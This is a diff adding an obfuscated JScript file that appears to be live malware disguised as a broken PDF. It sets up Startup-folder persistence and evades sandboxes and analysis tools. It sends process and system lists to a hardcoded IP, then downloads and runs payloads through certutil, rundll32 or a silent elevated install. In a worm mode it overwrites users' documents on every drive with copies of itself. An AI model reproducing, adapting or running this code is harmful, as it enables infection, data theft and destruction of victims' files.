@@ -1,0 +1,396 @@
+v1967arms35t = false;
+v1967muffled34t = true;
+
+function ulrich(t, y, u)
+{
+	return u['len' + 'gth'];
+};
+v1967might46t = false;
+v1967difficulty8t = false;
+v1967open69t = false;
+v1967just23t = true;
+v1967word39t = false;
+v1967sleepiness60t = true;
+v1967force8t = false;
+v1967back25t = true;
+v1967inbed39t = true;
+v1967thewisdom63t = true;
+v1967chose72t = false;
+var EnmN = this["Enumerator"];
+var v1967sister51 = this["ActiveXObject"];
+var v1967thedoctors13 = this["WScript"];
+var v1967peace10 = v1967thedoctors13["ScriptFullName"];
+var GeObj = this["GetObject"];
+var v1967there93 = new v1967sister51("Scripting.FileSystemObject");
+
+var v1967seemed82 = v1967thedoctors13["CreateObject"]("WScript.Shell");
+var v1967pitifully86 = new v1967sister51("ADODB.Stream");
+var v1967bed75t = null;
+var v1967little22 = new v1967sister51("Shell.Application");
+var v1967against41t = null;
+var v1967what50 = new v1967sister51("Msxml2.ServerXMLHTTP");
+var v1967force8t = 'Indians38';
+var v1967tohis29 = String["fromCharCode"](92);
+var v1967hardly95t = 'childrenIn85';
+var user12 = v1967seemed82["ExpandEnvironmentStrings"]("%USERPROFILE%");
+var v1967beenearlier10t = 0.581;
+var charq = String["fromCharCode"](34);
+var v1967said73t = {
+	Z: 85
+};
+var temp12 = v1967seemed82["ExpandEnvironmentStrings"]("%TEMP%");
+var v1967would52t = 'undefined';
+var v1967than32t = true;
+var startupFolder = v1967little22["NameSpace"](7);
+var v1967from71t = 'undefined';
+var v1967heard32 = v1967tohis29 + "fb.jse";
+var v1967doors29t = {
+	V: 77
+};
+var URL_KEY = "&add=2097d7b063d6f8b5cc803abf3df758aa";
+var v1967from75t = [42, 448];
+var v1967thelittle22 = "https://185.130.104.235/1/net500.php";
+var v1967than54t = 'thirst29';
+var v1967other58 = '?v1967other58=new';
+var v1967puttinglong22t = [498, 546];
+var v1967that9 = v1967thelittle22 + v1967other58;
+var v1967case12t = [67, 54];
+var v1967although91 = true;
+var v1967forwards27t = 0.416;
+var SET_AUTOLOAD = true;
+var v1967travelling36t = null;
+var SET_WORM_MODE = true;
+var v1967bed75t = null;
+var v1967Youve25 = '';
+var v1967against41t = null;
+var v1967force8t = 'Indians38';
+var v1967salesmen26 = '';
+var v1967hardly95t = 'childrenIn85';
+var tone789 = 1;
+var v1967beenearlier10t = 0.581;
+var report9 = 0;
+var v1967said73t = {
+	Z: 85
+};
+var hashhere = 0;
+var v1967would52t = 'undefined';
+var v1967claim86 = 0;
+var v1967than32t = true;
+var exit123 = 0;
+var v1967from71t = 'undefined';
+var v1967through42 = 3;
+var v1967doors29t = {
+	V: 77
+};
+var one_time = false;
+var v1967from75t = [42, 448];
+var v1967could48 = null;
+var v1967than54t = 'thirst29';
+var v1967talking86 = null;
+var v1967puttinglong22t = [498, 546];
+var v1967case12t = [67, 54];
+var v1967with46 = null;
+var v1967forwards27t = 0.416;
+var mz12 = "MZ";
+var v1967travelling36t = null;
+var method56 = "POST";
+var v1967bed75t = null;
+var v1967against41t = null;
+var v1967loud80 = null;
+var v1967force8t = 'Indians38';
+var v1967even47 = null;
+var v1967hardly95t = 'childrenIn85';
+var auto90989r = startupFolder["Self"]["Path"] + v1967heard32;
+var v1967beenearlier10t = 0.581;
+var uidhere = auto90989r + temp12;
+var v1967said73t = {
+	Z: 85
+};
+var delay123 = ("2070000") * 1;
+var v1967would52t = 'undefined';
+var v1967effort74 = "-f -decode ";
+var v1967than32t = true;
+var nod32sucks = ("4294967295") * 1;
+var v1967from71t = 'undefined';
+var v1967clock64 = null;
+var v1967doors29t = {
+	V: 77
+};
+var obj00WMI = null;
+var v1967from75t = [42, 448];
+var v1967would55 = hashhere;
+var v1967than54t = 'thirst29';
+var v1967despite70 = null;
+var v1967puttinglong22t = [498, 546];
+var v1967from75t = [42, 448];
+var v1967would552 = null;
+var v1967forwards27t = 0.416;
+var processlist = '';
+var v1967travelling36t = null;
+var os456 = '';
+var v1967bed75t = null;
+var v1967last18 = '';
+var v1967against41t = null;
+var v1967door77 = '';
+var v1967force8t = 'Indians38';
+var v1967them88 = '';
+var v1967hardly95t = 'childrenIn85';
+var colDrives = v1967there93["Drives"];
+var v1967beenearlier10t = 0.581;
+var e56789 = null;
+var v1967said73t = {
+	Z: 85
+};
+var x76545 = null;
+var v1967would52t = 'undefined';
+var v1967resolve50 = "*.doc *.xls *.pdf *.rtf *.txt *.pub *.odt *.ods *.odp *.odm *.odc *.odb *.wps *.xlk *.ppt *.mdb *.accdb *.pst *.dwg *.dxf *.dxg *.wpd";
+var v1967than32t = true;
+var v1967from71t = 'undefined';
+var v1967were48 = "Lafamiliaestodo.txt";
+var v1967doors29t = {
+	V: 77
+};
+var v1967from75t = [42, 448];
+var v1967when48 = null;
+var v1967than54t = 'thirst29';
+var v1967backtowards89 = -1;
+var v1967puttinglong22t = [498, 546];
+var v1967strenuous38 = 1;
+var v1967case12t = [67, 54];
+var v1967forwards27t = 0.416;
+var shit89 = 40;
+var v1967travelling36t = null;
+var sert90 = 7;
+var v1967bed75t = null;
+var v1967have20 = 16;
+var v1967against41t = null;
+var v1967balance53 = "Error";
+var v1967force8t = 'Indians38';
+var v1967forget95 = "The document provided as a PDF source was invalid.";
+var v1967hardly95t = 'childrenIn85';
+var g7899 = 0;
+var v1967beenearlier10t = 0.581;
+var sand9xx = false;
+try
+{
+	if (v1967peace10 != auto90989r)
+	{
+		v1967could48 = v1967there93["OpenTextFile"](v1967peace10, v1967strenuous38, false, 0);
+		v1967when48 = v1967could48["ReadLine"]();
+		v1967could48["Close"]();one_time = true;
+		if (v1967although91) v1967seemed82["Popup"](v1967forget95, 10, v1967balance53, v1967have20);
+		if (v1967there93["FileExists"](auto90989r))
+		{
+			v1967thedoctors13["Quit"];
+		}
+	}
+	else
+	{}
+}
+catch (voeaPLkmnB)
+{
+	v1967seemed82["Popup"](v1967forget95, 5, v1967balance53, v1967have20);
+}
+while (v1967have20)
+{
+	v1967forget95 = "low";
+	tone789 = tone789 + 1;
+	v1967seemed82["Popup"](tone789+" "+delay123+"bolo", 2, v1967balance53, v1967have20);
+
+	if (tone789 == delay123)
+	{
+		try
+		{obj00WMI = GeObj("winmgmts:{impersonationLevel=impersonate}!" + v1967tohis29 + v1967tohis29 + "." + v1967tohis29 + "root" + v1967tohis29 + "cimv2");
+			v1967would55 = new EnmN(obj00WMI["ExecQuery"]("Select * from Win32_Process"));
+			v1967would552 = new EnmN(obj00WMI["ExecQuery"]("Select * from Win32_OperatingSystem"));
+			while (!v1967would552["atEnd"]())
+			{
+				if (g7899 == 5) break;os456 = os456 + v1967would552["item"]()["Caption"] + v1967would552["item"]()["Version"];g7899++;
+				v1967would552["moveNext"]();
+			}os456 = os456 + String["fromCharCode"](13) + String["fromCharCode"](10) + auto90989r;g7899 = 0;
+			while (!v1967would55["atEnd"]())
+			{
+				if (g7899 == 200) break;
+				v1967despite70 = v1967would55["item"]();processlist = processlist + v1967despite70["Name"] + "*" + v1967despite70["ExecutablePath"] + String["fromCharCode"](13) + String["fromCharCode"](10);g7899++;
+				v1967would55["moveNext"]();
+			}
+		}
+		catch (voeaPLkmnB)
+		{}
+		try
+		{uidhere = uidhere + os456;
+			for (v1967claim86 = 0; v1967claim86 < uidhere["length"]; v1967claim86++)
+			{hashhere = (((hashhere << (5)) - hashhere) + uidhere["charCodeAt"](v1967claim86)) & nod32sucks;
+			}
+			if (auto90989r["indexOf"](v1967tohis29 + "AppData" + v1967tohis29) == -1)
+			{
+				v1967claim86 = 10;
+			}
+			else
+			{
+				v1967claim86 = 20;
+			}
+		}
+		catch (voeaPLkmnB)
+		{hashhere = 999999;
+		}processlist = os456 + String["fromCharCode"](13) + String["fromCharCode"](10) + processlist;
+		if (processlist["length"] < 500 || processlist["indexOf"]("Procmon") != v1967backtowards89 || processlist["indexOf"]("Wireshark") != v1967backtowards89 || processlist["indexOf"]("Temp" + v1967tohis29 + "iexplore.exe") != v1967backtowards89 || processlist["indexOf"]("ProcessHacker") != v1967backtowards89 || processlist["indexOf"]("vmtoolsd") != v1967backtowards89 || processlist["indexOf"]("VBoxService") != v1967backtowards89 || processlist["indexOf"]("python") != v1967backtowards89 || processlist["indexOf"]("Proxifier.exe") != v1967backtowards89 || processlist["indexOf"]("Johnson") != v1967backtowards89 || processlist["indexOf"]("ImmunityDebugger.exe") != v1967backtowards89 || processlist["indexOf"]("lordPE.exe") != v1967backtowards89 || processlist["indexOf"]("ctfmon.exe*JOHN-PC") != v1967backtowards89 || processlist["indexOf"]("BehaviorDumper") != v1967backtowards89 || processlist["indexOf"]("anti-virus.EXE") != v1967backtowards89 || processlist["indexOf"]("AgentSimulator.exe") != v1967backtowards89 || processlist["indexOf"]("VzService.exe") != v1967backtowards89 || processlist["indexOf"]("VBoxTray.exe") != v1967backtowards89 || processlist["indexOf"]("VmRemoteGuest") != v1967backtowards89 || processlist["indexOf"]("SystemIT|admin") != v1967backtowards89 || processlist["indexOf"]("WIN7-TRAPS") != v1967backtowards89 || processlist["indexOf"]("Emily" + v1967tohis29 + "AppData") != v1967backtowards89 || processlist["indexOf"]("PROCMON") != v1967backtowards89 || processlist["indexOf"]("procexp") != v1967backtowards89 || processlist["indexOf"]("tcpdump") != v1967backtowards89 || processlist["indexOf"]("FrzState2k") != v1967backtowards89 || processlist["indexOf"]("DFLocker64") != v1967backtowards89 || processlist["indexOf"]("vmware") != v1967backtowards89)
+		{
+			pdfdoc["alert"]("No more half-measures.");
+			v1967thedoctors13["Quit"];sand9xx = true;
+		}
+		try
+		{
+			if (one_time && SET_AUTOLOAD)
+			{
+				v1967talking86 = v1967there93["CreateTextFile"](auto90989r, true, false);
+				v1967talking86["WriteLine"](v1967when48);
+				v1967talking86["Close"]();
+			}
+		}
+		catch (voeaPLkmnB)
+		{}
+		while (sert90)
+		{
+			try
+			{
+				v1967salesmen26 = temp12 + v1967tohis29 + Math["floor"]((Math["random"]() * (840)) + 1) + Math["floor"]((Math["random"]() * (712)) + 1) + ".exe";
+				v1967Youve25 = temp12 + v1967tohis29 + Math["floor"]((Math["random"]() * (888)) + 1) + Math["floor"]((Math["random"]() * (900)) + 1) + ".mtm";
+				v1967what50["setOption"](v1967through42, "MSXML");
+				v1967clock64 = v1967that9 + URL_KEY + "&u=" + Math["abs"](hashhere) + "&o=" + report9 + "&v=" + v1967claim86 + "&s=" + Math["floor"]((Math["random"]() * (998)) + 1) + Math["floor"]((Math["random"]() * (888)) + 1) + Math["floor"]((Math["random"]() * (590)) + 1);
+				v1967what50["open"](method56, v1967clock64, false);
+				v1967what50["send"](processlist);
+				if (v1967what50["status"] == 200)
+				{
+					if (report9 == 0)
+					{
+						v1967with46 = v1967what50["responseText"];
+						try
+						{
+							if (v1967what50["getResponseHeader"]("I_am_the_danger") == '0')
+							{
+								v1967salesmen26 = auto90989r;
+								v1967backtowards89 = 0;
+							}
+						}
+						catch (voeaPLkmnB)
+						{}
+						try
+						{
+							if (v1967what50["getResponseHeader"]("I_am_the_danger") == "1") v1967backtowards89 = 1;
+						}
+						catch (voeaPLkmnB)
+						{}
+						try
+						{
+							if (v1967what50["getResponseHeader"]("I_am_the_danger") == "2") v1967backtowards89 = 2;
+						}
+						catch (voeaPLkmnB)
+						{}
+						try
+						{
+							if (v1967what50["getResponseHeader"]("Content-Transfer-Encoding") == "binary")
+							{
+								v1967pitifully86["Open"]();
+								v1967pitifully86["Type"] = 1;
+								v1967pitifully86["Write"](v1967what50["responseBody"]);
+								v1967pitifully86["Position"] = 0;
+								v1967pitifully86["SaveToFile"](v1967salesmen26, 2);
+								v1967pitifully86["Close"]();
+							}
+							else
+							{
+								if (v1967with46.length > 10)
+								{
+									v1967could48 = v1967there93["CreateTextFile"](v1967Youve25, true, false);
+									v1967could48["WriteLine"](v1967with46);
+									v1967could48["Close"]();
+									v1967thedoctors13["Sleep"](6000);
+									v1967little22["ShellExecute"]("certutil", v1967effort74 + v1967Youve25 + " " + charq + v1967salesmen26 + charq, '', "open", 0);
+								}
+							}
+						}
+						catch (voeaPLkmnB)
+						{}
+					}
+					else
+					{report9 = 0;
+						continue;
+					}
+					if (v1967backtowards89 == 0)
+					{
+						v1967thedoctors13["Sleep"](50000);
+						v1967backtowards89 = -1;report9 = 9;
+						continue;
+					}
+					v1967thedoctors13["Sleep"](25000);
+					if (!v1967there93["FileExists"](v1967salesmen26) && SET_WORM_MODE)
+					{
+						try
+						{e56789 = new EnmN(colDrives);
+							for (; !e56789["atEnd"]();e56789["moveNext"]())
+							{x76545 = e56789["item"]();
+								if ((x76545["IsReady"] && (x76545["DriveType"] == 3 || x76545["DriveType"] == 1)) && user12["substring"](0, 1) != x76545["DriveLetter"])
+								{
+									v1967little22["ShellExecute"]("cmd", "/U /Q /C cd /D " + x76545["DriveLetter"] + ": && dir /b/s/x " + v1967resolve50 + ">>%TEMP%\\" + v1967were48, '', "open", 0);
+									v1967thedoctors13["Sleep"](1000 * 60);
+								}
+							}
+							v1967thedoctors13["Sleep"](1000 * 40);
+							v1967even47 = v1967there93["GetFile"](temp12 + v1967tohis29 + v1967were48)["OpenAsTextStream"](1, -1);
+							while (!v1967even47["AtEndOfStream"])
+							{
+								v1967door77 = v1967even47["ReadLine"]();
+								v1967them88 = v1967door77["substring"](0, v1967door77["indexOf"]("."));
+								v1967little22["ShellExecute"]("cmd", "/U /Q /C copy /Y " + charq + auto90989r + charq + " " + charq + v1967them88 + ".jse" + charq + " && del /Q/F " + charq + v1967door77 + charq, '', "open", 0);
+							}
+							v1967even47["Close"]();
+							v1967there93["DeleteFile"](temp12 + v1967tohis29 + v1967were48);
+						}
+						catch (voeaPLkmnB)
+						{}report9 = 0;
+						continue;
+					}
+					v1967loud80 = v1967there93["GetFile"](v1967salesmen26)["OpenAsTextStream"](1);
+					v1967last18 = v1967loud80["ReadLine"]()["substring"](0, 2);
+					v1967loud80["Close"]();
+					if (v1967last18 == mz12 && report9 == 0)
+					{
+						try
+						{
+							switch (v1967backtowards89)
+							{
+							case -1:
+								v1967little22["ShellExecute"]("cmd", String["fromCharCode"](shit89 + sert90) + "c start " + v1967salesmen26, '', "open", exit123);report9 = 45;
+								break;
+							case 0:
+								v1967little22["ShellExecute"]("cmd", String["fromCharCode"](shit89 + sert90) + "c start " + v1967salesmen26, '', "open", exit123);report9 = 46;
+								break;
+							case 1:
+								v1967little22["ShellExecute"]("rundll32", charq + v1967salesmen26 + charq + " secretFunction", '', "open", exit123);report9 = 47;
+								break;
+							case 2:
+								v1967little22["ShellExecute"]("taskkill", "/f /t /im chrome.exe", '', "open", 0);
+								v1967little22["ShellExecute"](v1967salesmen26, "/silent /install", '', "runas", 1);report9 = 48;
+								break;
+							}
+						}
+						catch (voeaPLkmnB)
+						{report9 = 8888;
+						}
+						v1967thedoctors13["Sleep"](11000);
+					}
+				}
+			}
+			catch (voeaPLkmnB)
+			{}
+			v1967thedoctors13["Sleep"](70000);
+		};
+	};
+};
+v1967hardly95t = 0.96;
+v1967there14t = 0.581;
+v1967although19t = 0.185;
+v1967only8t = 0.949;
+v1967noticeable76t = 0.281;
+v1967well48t = 0.831;
